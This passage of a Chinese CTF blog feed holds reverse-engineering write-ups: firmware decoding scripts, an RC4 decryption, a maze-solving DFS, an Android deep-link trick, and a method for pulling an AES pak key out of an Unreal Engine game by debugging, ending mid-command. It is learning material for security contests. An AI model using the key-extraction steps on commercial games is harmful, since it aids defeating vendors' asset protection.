src="https://i.loli.net/2021/02/03/dmlE6NWgAMcjuOT.png" alt="image-20210203222138750"></p><p> 所以说要发现调用的地方，真正关心的地方是48h。<strong>执行的代码地址 = （门描述符中段选择子所指向的代码段的Base）+（门描述符高四字节的16-31位）+（门描述符低四字节的0-15位）。</strong></p><p>那题目在哪里找这个段描述符表？就是之前看过的DeviceIoControl的地方，那8个字节的数据。</p><p><img src="https://i.loli.net/2021/02/03/LTtVxlOFIEq8MHk.png" alt="image-20210203224418059"></p><p>再把调用代码中的段选择子分解一下（48h），得到3-16位的index：1001b = 9。这正好和r0层看到的一样。</p><p>最后就是从这8字节数据得到长调用函数地址了：</p><p><img src="https://i.loli.net/2021/02/03/aVrpT5UY1i7usmy.png" alt="image-20210203225024841"></p><p>回到r3层验证一下：</p><p><img src="https://i.loli.net/2021/02/03/CTPLONiF39QSxrV.png" alt="image-20210203225120306"></p><h2 id="固件安全"><a href="#固件安全" class="headerlink" title="固件安全"></a>固件安全</h2><h3 id="NodeMCU"><a href="#NodeMCU" class="headerlink" title="NodeMCU"></a><strong>NodeMCU</strong></h3><p>50分的值，直接ctrl+f找到flag。。</p><h3 id="STM"><a href="#STM" class="headerlink" title="STM"></a>STM</h3><p>知道了stm文件，而STM32其实是使用了ARM核的MCU。</p><p>这个我们可以用ida分析的，但要设置一下，不然ida也只是把它当成data文件看待。</p><p>首先设置架构：</p><p><img src="https://i.loli.net/2021/02/03/8tCAfWjSNszmL6Y.png" alt="image-20210203000903224"></p><p>编辑选项：</p><p><img src="https://i.loli.net/2021/02/03/9AFywDxIStoTVCM.png" alt="image-20210203004015462"></p><p>然后确定，把加载地址改为：0x08000000。进入后把开始的数据都转化为4字节型数据：</p><p><img src="https://i.loli.net/2021/02/03/gnX8JZ9KfrIiqBw.png" alt="image-20210203002010284"></p><p>双击第二个跳转到指定位置，然后在指定位置上面一些地方把数据转化为代码。可以发现ida左边出现了好几个函数。简单找一下即可看见关键函数，使用idapython按照它的算法逻辑打印出计算结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">addr = <span class="number">0x08000344</span></span><br><span class="line"><span class="keyword">while</span> addr &lt; <span class="number">0x0800036E</span>:</span><br><span class="line">    flag += chr((get_byte(addr)^<span class="number">0x1e</span>)+<span class="number">3</span>)</span><br><span class="line">    addr += <span class="number">1</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#flag&#123;1749ac10-5389-11eb-90c1-001c427bd493&#125;</span></span><br></pre></td></tr></table></figure><h3 id="easy-bios"><a href="#easy-bios" class="headerlink" title="easy_bios"></a>easy_bios</h3><p>首先将bios文件使用模拟器运行起来，从这得到了关键的字符串信息。</p><p><img src="https://i.loli.net/2021/02/03/fc7N3CXovWQD8ed.png" alt="image-20210203004245893"></p><p>尝试使用binwalk提取bios中的文件看看，提取出一个名为840A8的文件。</p><p>用010editor查看，发现了熟悉4D5A和紧跟着的5045，PE文件啊。。</p><p><img src="https://i.loli.net/2021/02/03/aIQTxqshEpv9oOm.png" alt="image-20210203005019542"></p><p>突然想到刚刚得到的关键字符信息，尝试搜索看看，找到了Getflag，其它字符换用unicode形式。突然明朗起来：</p><p><img src="https://i.loli.net/2021/02/03/XCFTuydJxGANan9.png" alt="image-20210203005236702"></p><p>但要注意的是这个文件中很多个PE文件，提取出出现Getflag字符串的PE文件，进行反编译：</p><p>从字符串定位到关键函数：再从Your Input定位到v12是我们的输入。<br><img src="https://i.loli.net/2021/02/03/aJQd1xwo76COHX2.png" alt="image-20210203124346558"></p><p>然后对于rc4加密，我们只关心最后的异或值，程序又运行不起来的，那把整个函数复制到到C编译器中简单修改一下再直接用来异或解密。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">70</span>, <span class="number">119</span>, <span class="number">116</span>, <span class="number">176</span>, <span class="number">39</span>, <span class="number">142</span>, <span class="number">143</span>, <span class="number">91</span>, <span class="number">233</span>, <span class="number">216</span>, </span><br><span class="line">  <span class="number">70</span>, <span class="number">156</span>, <span class="number">114</span>, <span class="number">231</span>, <span class="number">47</span>, <span class="number">94</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"OVMF_And_Easy_Bios"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, v13[<span class="number">514</span>] = &#123;<span class="number">0</span>&#125;, v2, v3, v4, v5, v6, v8;</span><br><span class="line"><span class="keyword">int</span> v7, v9, v10, v11, v12, result;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">256</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v13[i] = i;</span><br><span class="line">    v13[i + <span class="number">256</span>] = s[i % <span class="number">18</span>];</span><br><span class="line">  &#125;</span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v4 = v13[v2];</span><br><span class="line">v3 = (v13[v2 + <span class="number">256</span>] + v4 + v3) % <span class="number">256</span>;</span><br><span class="line">v5 = v13[v3];</span><br><span class="line">v13[v3] = v4;</span><br><span class="line">v13[v2++] = v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v2 != <span class="number">256</span> );</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v8 = (v8 + <span class="number">1</span>);</span><br><span class="line">    v9 = v13[v8];</span><br><span class="line">    v10 = (v9 + v7) % <span class="number">256</span>;</span><br><span class="line">    v11 = v13[v10];</span><br><span class="line">    v13[v10] = v9;</span><br><span class="line">    v7 = (v9 + v7) % <span class="number">256</span>;</span><br><span class="line">    v13[v8] = v11;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v13[(v11 + v13[v10]) % <span class="number">256</span>];</span><br><span class="line">    enc[v6++] ^= result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v6 != <span class="number">16</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02x"</span>, enc[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//88baec0b5154f859b5851097bb567f5c</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;二进制专场，Reverse做完了，内核安全做了1个，固件安全做了3个。总的来说题目难度不是很大，但考点还行。排名第一，个人做了1820分，其中pwn是i0gan做的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>DJBCTF</title>
    <link href="https://www.bxnop.cn/2021/01/26/DJBCTF/"/>
    <id>https://www.bxnop.cn/2021/01/26/DJBCTF/</id>
    <published>2021-01-26T03:07:43.000Z</published>
    <updated>2021-01-26T08:19:35.085Z</updated>
    
    <content type="html"><![CDATA[<p>整体感觉Re有点偏杂，有收获，主要是还拿了个杯子，hha。。</p><a id="more"></a><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="A-Maze-In"><a href="#A-Maze-In" class="headerlink" title="A-Maze-In"></a>A-Maze-In</h3><p>迷宫题，但是有点特别，就是每个步骤对应的地图不一样。。</p><p><img src="/2021/01/26/DJBCTF/image-20210126111337271-1611648503131.png" alt="image-20210126111337271"></p><p>提取出4个地图后，开始手走了一下，要命。。想到写一个dfs来搜索，这个应该是可行的，但我没有注意好走过的路径标记导致一直陷入了循环，找不解。。</p><p>后面从逆向的角度看，这个虽然正着走麻烦，但是从终点走到起点是每一步都确定的，走那一步看它反方向是不是为1即可。</p><p>因为每一步确定还是比较好走的：<strong>LLDRRDLLLDRDLDDDRRULURRULURRDDDLDR</strong></p><p>赛后对我之前写的dfs，发现主要是每次往回走导致一直陷入一个死胡同，就是走了L然后走R，那每次走之前加了个判断试试。。果然，秒出。。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> byte_404018[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> v5, <span class="keyword">int</span> v4, <span class="keyword">char</span> ch)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(i &gt; <span class="number">33</span> ) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(v4 == <span class="number">4</span>  &amp;&amp; v5 == <span class="number">7</span>) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"yes: %s\n"</span>, flag);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ch != <span class="string">'L'</span> &amp;&amp; (v5 &gt;= <span class="number">0</span> &amp;&amp; v4 &gt;= <span class="number">0</span>) &amp;&amp; (byte_404018+<span class="number">3</span>)[<span class="number">32</span> * v5 + <span class="number">4</span> * v4] == <span class="number">1</span> )</span><br><span class="line">  &#123; </span><br><span class="line">flag[i] = <span class="string">'R'</span>;</span><br><span class="line">    dfs(i+<span class="number">1</span>, v5, v4+<span class="number">1</span>, <span class="string">'R'</span>);</span><br><span class="line">  &#125; </span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> (ch != <span class="string">'R'</span> &amp;&amp; (v5 &gt;= <span class="number">0</span> &amp;&amp; v4 &gt;= <span class="number">0</span>) &amp;&amp; (byte_404018+<span class="number">2</span>)[<span class="number">32</span> * v5 + <span class="number">4</span> * v4] == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = <span class="string">'L'</span>;</span><br><span class="line">dfs(i+<span class="number">1</span>, v5, v4<span class="number">-1</span>, <span class="string">'L'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (ch != <span class="string">'U'</span> &amp;&amp; (v5 &gt;= <span class="number">0</span> &amp;&amp; v4 &gt;= <span class="number">0</span>) &amp;&amp; (byte_404018+<span class="number">1</span>)[<span class="number">32</span> * v5 + <span class="number">4</span> * v4] == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = <span class="string">'D'</span>;</span><br><span class="line"></span><br><span class="line">dfs(i+<span class="number">1</span>, v5+<span class="number">1</span>, v4, <span class="string">'D'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ch != <span class="string">'D'</span> &amp;&amp;  (v5 &gt;= <span class="number">0</span> &amp;&amp; v4 &gt;= <span class="number">0</span>) &amp;&amp; byte_404018[<span class="number">32</span> * v5 + <span class="number">4</span> * v4] == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = <span class="string">'U'</span>;</span><br><span class="line">dfs(i+<span class="number">1</span>, v5<span class="number">-1</span>, v4, <span class="string">'U'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">dfs(<span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="string">'1'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Matara-Okina"><a href="#Matara-Okina" class="headerlink" title="Matara Okina"></a>Matara Okina</h3><p>本来没怎么做过安卓，从这个题学了不少，比赛期间大多数时间都去学安卓了，虽然对解决本题用不上，但由此感觉安卓还是挺好玩的。</p><p>开始拿到题目对下面就有点疑惑：</p><p><img src="/2021/01/26/DJBCTF/image-20210125114031206-1611648521523.png" alt="image-20210125114031206"></p><p>知道是取出secret参数的值经过异或运算后和一个ans字符串比较一下。那就先求出来看看：<strong>Android_scheme_is_FUN</strong></p><p>开始以为这就是flag，结果不是，仔细看到是把这个字符串传入一个native层的check的函数的，通过一些运算显示出来。。其次看到scheme，加上之前的uri，突然明白了。。再到Mainifest看看，果然：</p><p><img src="/2021/01/26/DJBCTF/image-20210125114541846-1611648525744.png" alt="image-20210125114541846"></p><p>就类似我们点击一个链接打开app一样，自己写一个网页链接让手机点一下就可以了。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"sh0w://p4th/70/1nput?secret=Android_scheme_is_FUN"</span>&gt;</span>app<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="UnrealFlag"><a href="#UnrealFlag" class="headerlink" title="UnrealFlag"></a>UnrealFlag</h3><p>对于这个题，其实就是一个解密一个游戏中加密的数据，挺实战的，比赛时没做，也是信息搜索能力没到位，知道要解密pak文件但是google，baidu了半天都没找到一个合适的文章。这个文章赛后看到的，很清晰且全：<a href="https://blog.jamie.holdings/2019/03/23/reverse-engineering-aes-keys-from-unreal-engine-4-projects/" target="_blank" rel="noopener">Reverse Engineering AES Keys From Unreal Engine 4 Projects</a></p><p>前期准备就是下载要解密文件对应游戏使用的虚幻引擎版本，这里4.26。</p><p>然后找到要解密文件使用的key，最后使用下载引擎中提供的Urealpak.exe解密即可。</p><p>开始找key:</p><p>找到安装引擎目录的：<strong>D:\Epic Games\UE_4.26\Engine\Source\Runtime\PakFile\Private\IPlatformFilePak.cpp</strong>文件，查看代码，虽然这个引擎版本可能会有一定的区别，但都是DecryptData下手：第三个参数即是。</p><p><img src="/2021/01/26/DJBCTF/image-20210126140813667-1611648530624.png" alt="image-20210126140813667">)当为了在调试的时候好定位到上面这个函数，我们一般的方法是找到调用它的地方，直到有错误字符串信息出现（方便我们定位）。找引用的时候可能出现很多函数调用它的情况，但一般以LoadIndex()函数为最上层的函数，至于原因，上面文章有提到：</p><p><img src="/2021/01/26/DJBCTF/image-20210126140646329-1611648534391.png" alt="image-20210126140646329"></p><p>一直向上回溯找到了第一次出现字符串的地方，x64搜索看看，有的。</p><p><img src="/2021/01/26/DJBCTF/image-20210126142130832-1611648537839.png" alt="image-20210126142130832"></p><p>然后在x64中看的时候，源代码与其反汇编的结果并不是一一对应的，有可能一个函数是内联函数和反汇编结果是对一个函数进行了展开。这里就是：</p><p>首先看定位到字符串那一部分的源代码：</p><p><img src="/2021/01/26/DJBCTF/image-20210126151157572-1611648541083.png" alt="image-20210126151157572"></p><p>然后x64中的情况：</p><p><img src="/2021/01/26/DJBCTF/image-20210126151408840-1611648544164.png" alt="image-20210126151408840"></p><p>所以这里直接跟进我下断点的函数，然后从源代码可知，最后可从第三个参数获取key的函数在最后一个，但我们在x64中看到的是编译后的结果，一般编译器都会在初始和末尾添加一些检查函数的，这里大概猜一下，先在倒数第二个函数处下断然后看r8寄存器的值，如果不行继续换别的就是，反正范围就这么几个函数。</p><p>成功得到key，从hex转化为base64就好了。</p><p><img src="/2021/01/26/DJBCTF/image-20210126152347350-1611648547783.png" alt="image-20210126152347350"></p><p>最后：UnrealPak.exe accepts a “crypto.json” parameter. You will want to create this file somewhere and add the following，即创建一个和下面类似的文件，把找到的key写入指定位置。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"$types"</span>: &#123;</span><br><span class="line">    <span class="attr">"UnrealBuildTool.EncryptionAndSigning+CryptoSettings, UnrealBuildTool, Version=4.0.0.0, Culture=neutral, PublicKeyToken=null"</span>: <span class="string">"1"</span>,</span><br><span class="line">    <span class="attr">"UnrealBuildTool.EncryptionAndSigning+EncryptionKey, UnrealBuildTool, Version=4.0.0.0, Culture=neutral, PublicKeyToken=null"</span>: <span class="string">"2"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"$type"</span>: <span class="string">"1"</span>,</span><br><span class="line">  <span class="attr">"EncryptionKey"</span>: &#123;</span><br><span class="line">    <span class="attr">"$type"</span>: <span class="string">"2"</span>,</span><br><span class="line">    <span class="attr">"Name"</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"Guid"</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"Key"</span>: <span class="string">"uZFnisGm9AFdQ2hGBMRKm38+LAShgkbEMJOn8bv/arc="</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"SigningKey"</span>: <span class="literal">null</span>,</span><br><span class="line">  <span class="attr">"bEnablePakSigning"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"bEnablePakIndexEncryption"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"bEnablePakIniEncryption"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"bEnablePakUAssetEncryption"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"bEnablePakFullAssetEncryption"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"bDataCryptoRequired"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"SecondaryEncryptionKeys"</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来用指定格式的command解密：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"D:<span class="symbol">\E</span>pic Games"<span class="symbol">\U</span>E_4.26<span class="symbol">\E</span>ngine<span class="symbol">\B</span>inaries<span class="symbol">\W</span>in64<span class="symbol">\U</span>nrealpak.exe FindFlag-WindowsNoEditor.pak -Extract C:<span class="symbol">\U</span>sers<span class="symbol">\1</span>1480<span class="symbol">\D</span>esktop<span class="symbol">\s</span>ss<span class="symbol">\ </span>-cryptokeys=C:<span class="symbol">\U</span>sers<span class="symbol">\1</span>1480<span class="symbol">\D</span>esktop<span class="symbol">\s</span>ss<span 